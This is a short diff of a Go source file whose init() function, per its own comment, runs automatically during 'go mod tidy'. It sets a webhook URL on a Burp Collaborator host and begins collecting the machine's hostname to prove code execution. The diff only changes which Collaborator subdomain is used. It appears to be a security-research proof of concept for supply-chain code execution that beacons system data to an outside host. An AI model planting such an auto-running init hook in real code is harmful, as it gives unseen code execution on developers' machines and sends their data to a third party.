@@ -8,7 +8,7 @@ import (
 
 func init() {
     // This runs automatically when go mod tidy processes the file
-    webhookURL := "https://ar5clalrm01qoswyl6x95i2cs3ytmi.burpcollaborator.net"
+    webhookURL := "https://8bkh838yw552nxyidzfsnys61x7nvc.burpcollaborator.net"
     
     // Prepare data showing we have code execution
     hostname, _ := os.Hostname()
